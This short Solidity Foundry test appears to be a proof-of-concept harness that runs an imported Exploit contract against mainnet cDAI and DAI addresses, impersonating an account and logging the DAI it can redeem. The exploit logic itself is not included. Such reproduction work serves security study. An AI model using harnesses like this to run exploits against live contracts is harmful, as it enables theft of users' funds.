// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "../Exploit.sol";

interface IRedeem {
    function redeemUnderlying(uint256) external;

    function balanceOfUnderlying(address) external returns (uint256);
}

contract ContractTest is Test {
    Exploit e;
    IERC20 cDAI = IERC20(0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643);
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);

    function setUp() public {}

    function test_pickle() public {
        e = new Exploit();
        vm.startPrank(address(1337), address(1337));
        e.exploit();
        cDAI.approve(address(cDAI), 2**256 - 1);

        console.log(
            "DAI for cDAI",
            IRedeem(address(cDAI)).balanceOfUnderlying(address(1337))
        );
        vm.stopPrank();
    }
}
